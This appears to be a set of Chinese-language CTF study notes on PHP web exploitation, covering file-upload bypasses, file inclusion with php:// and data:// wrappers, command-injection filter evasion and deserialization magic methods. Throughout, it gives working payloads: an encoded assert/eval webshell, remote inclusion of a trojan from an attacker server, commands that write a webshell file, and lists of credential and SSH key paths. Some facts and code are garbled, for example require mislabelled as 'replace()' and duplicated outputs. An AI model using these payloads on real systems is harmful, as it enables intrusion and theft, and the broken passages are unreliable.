通过抓取上传数据包，修改上传的⽂件后缀，实现上传。\n绕过原理：\n● 在windows系统下，如果⽂件名以“.”或者空格作为结尾，系统会⾃动删除“.”与空格，利⽤此特性\n也可以绕过⿊名单验证。apache中可以利⽤点结尾和空格绕过，asp和aspx中可以⽤空格绕过。\n● 经过脚本⼀系列的处理之后原本.php. .的后缀名变成了.php. ，\n⽽由于Windows的特性，⼜将⽂件末尾的点给去除了，\n最终就存的时候.php的⽂件。同理也可以上传.htaccess. .等⽂件。。。\n(就算没有经过脚本的处理,.php. .在windows中也是会被存储为.php)\n3）00截断\n\n\n\n\n\n\n\n\n绕过原理：\n● 这时候就要利⽤0x00截断原理了，具体原理是 系统在对⽂件名的读取时，如果遇到0x00，就会认\n为读取已结束。\n● 但要注意是⽂件的16进制内容⾥的00，⽽不是⽂件名中的00 ！！！就是说系统是按16进制读取⽂\n件（或者说⼆进制），\n● 遇到ascii码为零的位置就停⽌，⽽这个ascii码为零的位置在16进制中是00，⽤0x开头表示16进\n制，也就是所说的0x00截断\n● 当系统读取到0x00时，认为已经结束，不会再读取后⾯将要拼接的13.jpg,认为是php⽂件，\n完成绕过。\n%00截断 与 0x00截断的区别？\n● 地址上⾯⽂件命名的区别。\n● %00上是建⽴在地址信息上的\n● 0x00 ⽂件\n● 操作⽅法基本⼀致。\n%00截断 与 0x00截断的实战中的区别？\n● 平时⼀定要多观察⼀下数据包，数据包中包含了很多参数，很多参数可以进⾏修改。\n4）二次渲染+条件竞争\n\n\n\n\n\n\n\n\n⼆次渲染：就是根据⽤户上传的图⽚，新⽣成⼀个图⽚，将原始图⽚删除，将新图⽚添加到数据库中。⽐如⼀些⽹站根据⽤户上传的头像⽣成⼤中⼩不同尺⼨的图像\n\n\n\n\n\n\n\n\n\n条件竞争就是在，当二次渲染先把文件移动到储存目录后，才判断文件是否合法时就产⽣了漏洞，会有⼀个短暂的时间将我们上传的webshell存储在⽬录下，且以我们上传的⽂件名的形式\n但是这个时间相当相当短暂，以⾄于，你打开上传⽬录，点击上传⽂件，你连影⼦都看不到就已经没了，\n所以这个时候我们可以使⽤burpsuite，我们先抓包，然后发送到intruder模块。点击clear去除所有参数，然后payload选择⽆，并且选择持续发包。\n\n\n\n\n\n\n\n\n\n⼆次渲染只能靠这个条件竞争去绕过么？○ ⼆次渲染：说的是这个技术叫做⼆次渲染，不是说⼆次渲染有漏洞。○ 有漏洞可利⽤的原因是因为，他是在⽂件上传之后才有的后续操作，第⼀步的时候已经将⽂件上传到服务器上了。○ 如果这个⼆次渲染在第⼀步之前，这个⼆次渲染是没有任何问题的。○ ⼆次渲染不是漏洞，是⼀种技术，是⼀种逻辑上的验证，条件竞争。○ 利⽤条件竞争，防⽌他第⼆步操作\n\n七、文件包含1.文件包含的四个函数：1.include():将在其被调用的位置处包含一个文件。包含一个文件与在该语句所在位置复制制定文件的数据具有相同内容的效果。使用include()时可以忽略括号。\n2.include_once():在脚本执行期间包含并运行指定文件。此行为和 include() 语句类似，唯一区别是include_once()会先判断一下这个文件在之前是否已经被包含过，如已经包含，则忽略本次包含。\n3.replace() :很大程度上与include相同，都是将一个模板文件包含到require调用坐在的位置。\nrequire和include之间有两点重要的区别:\n1.无论require的位置如何，制定文件都将包含到出现require的脚本中。例如，即使require放在计算结果为假的if语句中，依然会包含指定文件。2.require出错时，脚本将停止运行，而在使用include的情况下，脚本将继续执行。\n4.replace_once():在脚本执行期间包含并运行指定文件。此行为和 require() 语句类似，唯一区别是require_once()会先判断一下这个文件在之前是否已经被包含过，如已经包含，则忽略本次包含\n*require_once()多次包含下面是一篇关于require_once被使用后不能再使用怎么绕开的文章，本人在2022年5月Dest0g3二次招新比赛遇到类似，特此记录\n\n\n\n\n\n\n\n\n\nphp源码分析 require_once 绕过不能重复包含文件的限制\n\n\n\n\n\n\n\n\n\nrequire_once()在对软链接的操作上存在一些缺陷，软连接层数较多会使hash匹配直接失效造成重复包含，超过20次软链接后可以绕过，外加伪协议编码一下：\n?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n下面该题代码\n&lt;?php highlight_file(&lt;?php highlight_file(__FILE__); \n//find something in flag1.php \n$d = $_GET[&#x27;d&#x27;]; \n$file = $_GET[&#x27;ctf&#x27;]; \nif (filter_var($d, FILTER_VALIDATE_URL)) &#123;   \n    $r = parse_url($d);   \n    if (isset($file)) &#123;     \n        if (strpos($file, \"lai\") !== false &&\n  strpos($file, \"ya\") !== false)  &#123;       \n            @include($file . &#x27;.php&#x27;);     \n        &#125; else &#123;       \n            die(\"Sorry, you can not pass\");     \n        &#125;     \n        if (preg_match(&#x27;/labour$/&#x27;, $r[&#x27;host&#x27;])) &#123;   \n                  @$a = file_get_contents($d);       \n                  echo ($a);     \n                &#125; else &#123;                                      die(\"error\");     \n                                    &#125;  \n    &#125; else &#123;    \n          die(\"why?\");   \n    &#125; \n&#125; else &#123;   \n    echo \"Invalid URL\"; \n&#125;\n\n文章关键：\nphp的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经require_once(&#39;flag.php&#39;)，已经include的文件不可以再require_once。\n今天就来谈谈，怎么设想如何绕过这个哈希表，让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容。\n在这里有个小知识点，/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过\npayload:\n?d&#x3D;0:&#x2F;&#x2F;labour&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flll1ag2.txt&amp;ctf&#x3D;laiya\n2.php伪协议内容来自于https://blog.csdn.net/qz362228/article/details/124359070\n\n1.php:&#x2F;&#x2F;协议·条件：\nallow_url_fopen:off/on\nallow_url_include #仅php://input php://stdin php://memory php://temp 需要on\n\n·作用：\n\n\n\n\n\n\n\n\n\nphp:// 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。\n·说明：\n\n\n\n\n\n\n\n\n\nPHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器\n2.php:&#x2F;&#x2F;filter伪协议·条件\nallow_url_fopen=on/off\nallow_url_include=on/off\n\n\n\n\n\n\n\n\n\n\n只是读取，需要开启allow_url_fopen，不需要开启allow_url_include\n·说明：\n\n\n\n\n\n\n\n\n\n元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写①输出进行base64加密后的信息\n?file=php://filter/convert.base64-encode/resource=xx.php\n\n或\n?file=php://filter/read=convert.base64-encode/resource=xx.php\n\n②获得将base64加密后的信息后，再将其解密，得出原信息\n绕过base过滤php://filter/string.rot13/resource=flag.php\n\n\n\n\n\n\n\n\n\n\nROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。\n3.php:&#x2F;&#x2F;input（读取POST数据）·条件\nallow_url_fopen=on/off\nallow_url_include=on\n\n·说明\n\n\n\n\n\n\n\n\n\n可以访问请求的原始数据的只读流。在post请求中能查看请求的原始数据，并将post请求中的post数据当作php代码执行。（只读流是说只能进行读操作的数据）\n例如\n下面的POST数据里的命令就会被执行\n\n\n\n\n\n\n\n\n\n\n即可以直接读取到POST上没有经过解析的原始数据。 enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的\n注 ：\n\n\n\n\n\n\n\n\n\n查看当前运行的是哪个php.ini2,3需要将php可执行加入环境变量, 如果没有加,那么请使用php可执行文件所在位置的完整路径代替\n\n\n\n\n\n\n\n\n\n\n\n\n打印出phpinfo(); 找到Loaded Configuration File那一行\n\n\n\n\n\n\n\n\n\n\n\n\n\n命令行输入\nphp -i |grep php.ini（php -i其实就是输出phpinfo();)\n\n\n\n\nphp -r “phpinfo();” |grep php.ini\n4.file:&#x2F;&#x2F;伪协议（读取文件内容）   ·条件\nallow_url_fopen=on/off\nallow_url_include=on/off （均不受影响）\n\n打ctf中常用于读取本地文件\n?file=file://C:\\Windows\\System32\\drivers\\etc\\hosts\n\n\n5.phar:&#x2F;&#x2F;伪协议(读取压缩包文件内容)·条件\nallow_url_fopen: off/on\nallow_url_include: off/on (均不受影响)\n\n注：\n\n\n\n\n\n\n\n\n\nphp 版本大于等于5.3.0，压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。\n·格式\n?file=phar://压缩包名/内部文件名\n\n例，\nphar://x.zip/x.php\n\n6.zip:&#x2F;&#x2F;伪协议\n\n\n\n\n\n\n\n\nzip伪协议和phar协议类似，但是用法不一样（url不同）\n·条件\nallow_url_fopen: off/on\nallow_url_include: off/on (均不受影响)\n\n·格式\n?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]\n\n例，\nzip://D:\\phpstudy\\WWW\\x.zip%23shell.php       #->%23\n\n7.data:&#x2F;&#x2F;伪协议(读取文件)\n\n\n\n\n\n\n\n\n（可以直接达到执行php代码的效果）和php://input很像，php://input以post提交数据那样提交数据，data://是以get方式提交数据，也是可以执行提交的脚本\n·格式\n\n\n\n\n\n\n\n\n\n?file=data://text/plain,\n\n如果对特殊字符进行了过滤，可以通过base64编码后再输入\ndata://text/plain;base64,base64加密的代码\n\n可配合php命令执行漏洞，实现对一些数据的获取如：&lt;?php system(&quot;ls&quot;)?&gt;\n8.总结\n\n\n\n\n\n\n\n\n参考实例1\n参考实例2\n3.绕过1）路径长度绕过后缀&#x27;123&#x27;];\ninclude($a.&#x27;.html&#x27;);\n?>\n\n如果限制了文件类型，比如这里只能包含html后缀的文件，那么就可以使用此方法\n操作系统存在最大路径长度的限制\n\n\n\n\n\n\n\n\n\nwindows系统，文件名最长256个字符\nlinux系统，文件名最长4096个字符(浏览器最多只能输入300多个字符，所以需要抓包)前面加.&#x2F;.&#x2F;.&#x2F;.&#x2F;…………xx.php\n可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名被中途截断\n在文件后面加. 如： \n\n\n\n\n\n\n\n\n\ninfo.php………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………….html\n.超过256个就行，后面多出来的...........................................html不会被识别到\n2）? 截断后缀往往文件包含中会出现\n\n\n\n\n\n\n\n\n\n(&quot;$file&quot;.&quot;.html&quot;)这里以html为例子，这样我们输入的文件名称参数后面终会跟上.html后缀，从而导致文件包含失败\n要截断后缀，只需要在末尾添加 ? 即可，这样后缀就会变成 URL 的参数\n3）.点被过滤，网址&#x2F;IP无法输入ip转长整型,里面有一句话木马,需要vps\n\n\n\n\n\n\n\n\n\nhttps://www.bejson.com/convert/ip2int/\n如将IP地址219.239.110.138转换为数字：\n219 * 256^3 + 239 * 256^2 + 110 * 256^1 + 138 * 256^0 = 3689901706\n\n因此，219.239.110.138的数字地址为3689901706。\ninclude \"http://3689901706\";\n\n4）;被过滤?&gt;闭合代码\n因为?&gt;可以代替php代码中最后一个分号的作用\n\n5）强制加后缀如 include($cmd.\".php\")\n$cmd=data://text/plain,\n// 后面再拼接上.php的时候，由于php语句已经闭合，所以起不了什么作用\n\n6）路径过滤如replace(&#x27;./&#x27;,&#x27;&#x27;) ==>\n可以用 ...//...//...//...//...//flag\n\n4.敏感文件路径读取网站配置文件dedecms 数据库配置文件 data/common.inc.php,\ndiscuz 全局配置文件 config/config_global.php,\nphpcms 配置文件 caches/configs/database.php\nphpwind 配置文件 conf/database.php\nwordpress 配置文件 wp-config.php\n\nWindowsC:/boot.ini//查看系统版本\nC:/Windows/System32/inetsrv/MetaBase.xml//IIS 配置文件\nC:/Windows/repairsam//存储系统初次安装的密码\nC:/Program Files/mysql/my.ini//Mysql 配置\nC:/Program Files/mysql/data/mysql/user.MYD//Mysql   root\nC:/Windows/php.ini//php 配置信息\nC:/Windows/my.ini//Mysql 配置信息\n\nLinux/proc/self/root #指向根目录\n/proc/maps    #记录一些调用的拓展或者自定义的so文件\n/proc/self/environ #环境变量\n/proc/environ  #环境变量\n/proc/comm    #当前进程运行的程序\n/proc/cmdline #程序运行的绝对路径\n/proc/cpuset #docker环境可以看 machine ID\n/proc/cgroup #docker环境全是 machine ID 不常用\n/root/.ssh/authorized_keys\n/root/.ssh/id_rsa\n/root/.ssh/id_ras.keystore\n/root/.ssh/known_hosts\n/root/.bash_history\n/root/.mysql_history\n\nCTF中flag的路径常见读取，爆破测试字典\n\n\n\n\n\n\n\n\n\nev0A&#x2F;ArbitraryFileReadList: CTF中任意文件读取的fuzz列表 (Arbitrary file read fuzz list in CTF) (github.com)\n八、逻辑漏洞\n\n\n\n\n\n\n\n\n一般在支付购买处代码，对数据处理出现逻辑错误，对用户输入的数据没有进行严格审查，导致逻辑漏洞，使得用户获取不属于他的权限或者信息内容\n九、命令执行1.有关命令执行的知识（windows 或 linux 下）:\n\n\n\n\n\n\n\n\n1）command1 ; command2 用;隔开表示为多个命令，命令按照从左到右的顺序执行，彼此无关联，所有的命令都会执行。先执行 command1 后执行 command2\n2）command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2\n3）command1 | command2 将两个命令分开，左边命令的输出作为右边命令的输入，只执行 command2\n4）command1 &amp; command2 &amp;表示任务后台执行，与nohup命令功能差不多，先执行 command2 后执行 command1\n5）command1 || command2 先执行 command1，如果为假，再执行 command2\n命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符）\neg:\nfind  / -name &quot;flag* &quot;在当前目录及其子目录下查找文件名中包含flag的文件find  / -name &quot; *.txt&quot;在当前目录及其子目录下查找后缀为txt的文件\n绕过过滤1.过滤cat\n\n\n\n\n\n\n\n\nmore，less，head，tac都可以对文本进行读取\n2.过滤空格\n\n\n\n\n\n\n\n\nIFS$9、%09、&lt;、&gt;、&lt;&gt;、&#123;,&#125;、%20、$&#123;IFS&#125;、$&#123;IFS&#125;来代替空格\n\n\n\n\n\n\n\n\n\n&lt;,&gt;是把内容导向某个地方，可以是文件，也可以是命令\n如cat&lt;flag.php就是相当于，把flag.php内容用cat命令显示出来\n%09是tab键，可以补全内容\n比如过滤了flag，但是需要访问flag233.php\n那么就可以cat %09*233.php，就可以了\n3.过滤目录分隔符\n\n\n\n\n\n\n\n\n也就是&#x2F;不能用了，不能直接查看文件目录\ncat /flag_is_here/flag_9012297169124.php\n可以利用分号使两个命令同时进行也就是\n127.0.0.1;cd flag_is_here;cat flag_9012297169124.php\n4.过滤运算符可以用;代替管道运算符\n5.绕过正则匹配比如\nif(preg_match(\"/[A-Za-z0-9]+/\",$code))\n\n所有大小写字母和数字都被正则匹配过滤\n这里就需要\n法1：取反绕过：取反就是将数字转化为二进制,再把二进制中的1变成0,0变成1\n~是取反符号，\n\n\n结果：\n%9E%8C%8C%9A%8D%8B\n%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6\n\n\n\n\n\n\n\n\n\n\nphp断言：assert — 检查一个断言是否为 false，如果参数是字符串，它将会被 assert() 当做 PHP 代码来执行\n然后再赋值\n?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6);\n\n\n\n\n\n\n\n\n\n\n注意后面要有;代表php代码结束这里~是取反，之前urlencode里取反了一次，赋值时再取反一次，相当于没有取反等同于\n?code=(assert)(eval($_REQUEST[8]))\n\n(assert)因为是assert是函数，被当作函数执行，于是因为断言(eval($_REQUEST[8]))，所以把eval($_REQUEST[8])当作php执行，于是就可以拿到shell了\n蚁剑连接\nhttp://url?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6);\n\n法2：异或绕过:在PHP中两个字符串异或之后，得到的还是一个字符串。 例如：异或 ? 和 ~ 之后得到的是 A\n\n\n\n\n\n\n\n\n\n字符：?         ASCII码：63           二进制：  00‭11 1111‬字符：~         ASCII码：126          二进制：  0111 1110‬异或规则：1   XOR   0   &#x3D;   10   XOR   1   &#x3D;   10   XOR   0   &#x3D;   01   XOR   1   &#x3D;   0上述两个字符异或得到 二进制：  0100 0001该二进制的十进制也就是：65对应的ASCII码是：A\n本题preg_replace()过滤了所有英文字母和数字，但是ASCII码中还有很多字母数字之外的字符，利用这些字符进行异或可以得到我们想要的字符\n\n\n\n\n\n\n\n\n\nPS：取ASCII表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号\n法3：反斜杠\\转义绕过对于\nif(preg_match(\"/ls|tee|head|wegt|nl|vi|vim|file|sh|dir|cat|more|less|tar|mv|cp|wegt|php|sort|echo|bash|curl|uniq|rev|\\\"|\\&#x27;| |\\/||\\\\|/i\", $ip,$match))\n\n\n\n\n\n\n\n\n\n\n在这个正则匹配中并没有过滤反斜杠\\\n所以虽然我们执行ls之类会被过滤，但是执行l\\s时，会绕过ls的匹配，但是仍然能实现ls的功能\n对于文件名比如php过滤，也可以用反义字符p\\ph，同样也可以绕过\n6.绕过长度限制&gt;和&gt;&gt;两个符号的使用\n\n\n\n\n\n\n\n\n\n使用&gt;命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建文件再存入\n\n\n\n\n\n\n\n\n\n\n&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容\n\n2.常用命令\n\n\n\n\n\n\n\n\nls\ncat\ntouch\n#创建文件，一般创建脚本文件，\n比如touch haha.php\n然后再执行\necho \"\">>haha.php\n\n，在脚本文件里写一串一句话木马\n但是注意因为有$，后面的看可能会被当做变量，所以可以加上反斜杠\\转义\necho \"\">>haha.php\n十、暴力破解\n\n\n\n\n\n\n\n\n一把搜哈就完事（奸笑）\n十一、反序列化漏洞（PHP）\n\n\n\n\n\n\n\n\n原文链接1\n原文链接2\n序列化：\n\n\n\n\n\n\n\n\n序列化(Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。\nphp的序列化和反序列化\n\n\n\n\n\n\n\n\n概念：php的序列化将对象转化为了字符串，包含了对象的所有数据信息，反序列化时再根据这些信息还原对象。\nphp的序列化和反序列化由\nserialize()和unserialize()\n这两个函数来完成。\nserialize()完成序列化的操作，将传入的值转换为序列化后的字符串；\n而unserialize()完成反序列化的操作，将字符串转换成原来的变量。\nserialize(mixed $value): stringserialize()返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方：\nO::””::{&lt;field name 1&gt;&lt;field value 1&gt;…}\n\n  \n\n\n\n\n\n\n\n\n\n当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 wakeup() 成员函数。unserialize(string $str): mixed  unserialize()对单一的已序列化的变量进行操作，将其转换回 PHP 的值。若被反序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 wakeup() 成员函数（如果存在的话）。\n注意：\nprivate声明\n\n\n\n\n\n\n\n\n\nprivate 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。\n因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度\n%00也就是空字符，无法复制，只能自己修改二进制，或者自己加上\nphp魔术方法\n\n\n\n\n\n\n\n\n原文链接\n PHP中以两个下划线开头的方法，\n\n\n\n\n\n\n\n\n\n__construct(),__destruct(),__call(),__callStatic(),__get(),__set(),__isset(),__unset(),__sleep(),__wakeup(),__toString(),__set_state(),__clone()，__autoload()\n被称为”魔术方法”（Magic methods）。这些方法在一定条件下有特殊的功能，在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能\n与序列化和反序列化的魔术方法主要是：\n\n\n\n\n\n\n\n\n\n__construct()\t&#x2F;&#x2F;当一个对象创建时被调用\n__destruct() \t&#x2F;&#x2F;对象被销毁时触发\n__wakeup() \t&#x2F;&#x2F;使用unserialize时触发\n__sleep() \t&#x2F;&#x2F;使用serialize时触发\n__toString() \t&#x2F;&#x2F;把类当做字符串时触发1.{因为echo无法输出对象，所以可以利用该魔法方法，在直接输出对象引用的时候，就不会产生错误，而是自动调用了”__toString()”方法, 输出“__toString()”方法中返回的字符，所以“__toString()”方法一定要有个返回值(return 语句)}2.当然除了当作字符串打印时会触发，当把实例化的类当作字符串进行preg_match匹配时，也会触发\n__get() \t&#x2F;&#x2F;用于从不可访问的属性读取数据\n__set() \t&#x2F;&#x2F;用于将数据写入不可访问的属性\n__invoke()  &#x2F;&#x2F;当脚本尝试将对象调用为函数时触发\n__call()     &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发\n__callStatic()  &#x2F;&#x2F;在静态上下文中调用不可访问的属性\n__isset()   &#x2F;&#x2F;当对不可访问属性调用isset()或empty()时调用\n__set_state()   &#x2F;&#x2F;调用var_export()导出类时，此静态方法会被调用。\n__clone()  &#x2F;&#x2F;当对象复制完成时调用\n__autoload()   &#x2F;&#x2F;尝试加载未定义的类\n__debugInfo()   &#x2F;&#x2F;打印所需调试信息\n·注意：\n\n\n\n\n\n\n\n\n\nPHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。\n·sleep() 和 wakeup()\npublic __sleep ( void ) : array\n__wakeup ( void ) : void\n\nserialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。\nNote\n\n\n__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。\n__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。\n与之相反，unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。\n__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。\n\n访问控制\n\n\n\n\n\n\n\n\n\n\nPHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。\npublic（公有）：公有的类成员可以在任何地方被访问。\nprotected（受保护）：受保护的类成员则可以被其自身以及其子类和父类访问。\nprivate（私有）：私有的类成员则只能被其定义所在的类访问。\n\nunserialize() 将已序列化的字符串还原回 PHP 的值。序列化请使用 serialize() 函数。\n语法\n\n\n\n\n\n\n\n\n\nunserialize(str)\n参数    描述str    必需。一个序列化字符串。__wakeup()是用在反序列化操作中。unserialize()会检查存在一个__wakeup()方法。如果存在，则先会调用__wakeup()方法。\n\n\n__construct()__construct()被称为构造方法，也就是在创造一个对象时候，首先会去执行的一个方法。但是在序列化和反序列化过程是不会触发的。\n\nclass User&#123;\n\n    public $username;\n\n    public function __construct($username)\n    &#123;\n        $this->username = $username;\n        echo \"__construct test\";\n    &#125;\n\n&#125;\n$test = new User(\"F0rmat\");\n$ser = serialize($test);\nunserialize($ser);\n?>\n\n运行结果：\n__construct test\n\n可以看到，创建对象的时候触发了一次，在后面的序列化和反序列化过程中都没有触发。\n\n__destruct()在到某个对象的所有引用都被删除或者当对象被显式销毁时执行的魔术方法。\n\nclass User&#123;\n\n    public function __destruct()\n    &#123;\n        echo \"__destruct test\";\n    &#125;\n\n&#125;\n$test = new User();\n$ser = serialize($test);\nunserialize($ser);\n?>\n\n运行结果：\n__destruct test\n__destruct test\n\n可以看到执行了两次__destruct()，因为一个就是实例化的时候创建的对象，另一个就是反序列化后生成的对象。\n\n__call在对象中调用一个不可访问方法时，__call() 会被调用。也就是说你调用了一个对象中不存在的方法，就会触发。\n\nclass User&#123;\n\n    public function __call($arg1,$arg2)\n    &#123;\n        echo \"$arg1,$arg2[0]\";\n    &#125;\n\n&#125;\n$test = new User();\n$test->abc(&#x27;a&#x27;);\n?>\n\n运行结果：\nabc,a\n\n可以看到**__call**需要定义两个参数，一个是表示调用的函数名，一般开发会在这里报错写xxx不存在这个函数，第二个参数是传入的数组，这里只传入了一个a。\n\n__callStatic在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用。\n\nclass User&#123;\n\n    public static function __callStatic($arg1,$arg2)\n    &#123;\n        echo \"$arg1,$arg2[0]\";\n    &#125;\n\n&#125;\n$test = new User();\n$test::callxxx(&#x27;a&#x27;);\n?>\n\n运行结果：\ncall xxx,a\n\n这里先来学习一下双冒号的用法，双冒号也叫做范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是一对冒号，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法。自 PHP 5.3.0 起，可以通过变量来引用类，该变量的值不能是关键字（如 self，parent 和 static）。与**__call不同的是需要添加static**，只有访问不存在的静态方法才会触发。\n\n__get读取不可访问属性的值时，__get() 会被调用。\n\nclass User&#123;\n    public $var1;\n    public  function __get($arg1)\n    &#123;\n        echo $arg1;\n    &#125;\n\n&#125;\n$test = new User();\n$test->var2;\n?>\n\n运行结果：\nvar2\n\n__get魔术方法需要一个参数，这个参数代表着访问不存在的属性值。\n\n__set给不可访问属性赋值时，__set() 会被调用。\n\nclass User&#123;\n    public $var1;\n    public  function __set($arg1,$arg2)\n    &#123;\n        echo $arg1.&#x27;,&#x27;.$arg2;\n    &#125;\n\n&#125;\n$test = new User();\n$test->var2=1;\n?>\n\n运行结果：\nvar2,var2,1\n\nset跟get相反，一个是访问不存在的属性，一个是给不存在的属性赋值。\n\n__isset\n对不可访问属性（比如private的属性）调用 isset() 或 empty() 时，__isset() 会被调用。\n\nclass User&#123;\n    private $var;\n    public  function __isset($arg1)\n    &#123;\n        echo $arg1;\n    &#125;\n\n&#125;\n$test = new User();\nisset($test->var1);\n?>\n\n运行结果：\nvar1\n\n该魔术方法使用了isset()或者empty()只要属性是private或者不存在的都会触发。\n\n__unset对不可访问属性调用 unset() 时，**__unset()** 会被调用。\n\nclass User&#123;\n    public  function __unset($arg1)\n    &#123;\n        echo $arg1;\n    &#125;\n\n&#125;\n$test = new User();\nunset($test->var1);\n?>\n\n运行结果：\nvar1\n\n如果一个类定义了魔术方法 __unset() ，那么我们就可以使用 unset() 函数来销毁类的私有的属性，或在销毁一个不存在的属性时得到通知。\n\n__sleepserialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。\n\nclass User&#123;\n    const SITE = &#x27;uusama&#x27;;\n\n    public $username;\n    public $nickname;\n    private $password;\n\n    public function __construct($username, $nickname, $password)\n    &#123;\n        $this->username = $username;\n        $this->nickname = $nickname;\n        $this->password = $password;\n    &#125;\n\n    // 重载序列化调用的方法\n    public function __sleep()\n    &#123;\n        // 返回需要序列化的变量名，过滤掉password变量\n        return array(&#x27;username&#x27;, &#x27;nickname&#x27;);\n    &#125;\n\n&#125;\n$user = new User(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;);\necho serialize($user);\n\n运行结果：\nO:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:\"b\";&#125;\n\n可以看到执行序列化之前会先执行sleep()函数，上面sleep的函数作用是过滤掉password的变量值。\n\n__wakeupunserialize() 会检查是否存在一个__wakeup()方法。如果存在，则会先调用 __wakeup() 方法，预先准备对象需要的资源。\n预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。\n\nclass User&#123;\n    const SITE = &#x27;uusama&#x27;;\n\n    public $username;\n    public $nickname;\n    private $password;\n    private $order;\n\n    public function __construct($username, $nickname, $password)\n    &#123;\n        $this->username = $username;\n        $this->nickname = $nickname;\n        $this->password = $password;\n    &#125;\n\n    // 定义反序列化后调用的方法\n    public function __wakeup()\n    &#123;\n        $this->password = $this->username;\n    &#125;\n&#125;\n$user_ser = &#x27;O:4:\"User\":2:&#123;s:8:\"username\";s:1:\"a\";s:8:\"nickname\";s:1:\"b\";&#125;&#x27;;\nvar_dump(unserialize($user_ser));\n\n运行结果：\nclass class User#1 (4) &#123;\n  public $username =>\n  string(1) \"a\"\n  public $nickname =>\n  string(1) \"b\"\n  private $password =>\n  string(1) \"a\"\n  private $order =>\n  NULL\n&#125;\n\n可以看到执行反序列化之前会先执行wakeup()函数，上面wakeup的函数作用是将username的变量值赋值给password变量。\n\n__toString__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。\n\nclass User&#123;\n\n    public function __toString()\n    &#123;\n       return &#x27;__toString test&#x27;;\n    &#125;\n\n&#125;\n\n$test = new User();\necho $test;\n\n运行结果：\n__toString test\n\n特别注意__toString的触发条件，引用k0rz3n师傅的笔记：\n\n\n\n\n\n\n\n\n\n(1)echo ($obj) &#x2F; print($obj) 打印时会触发 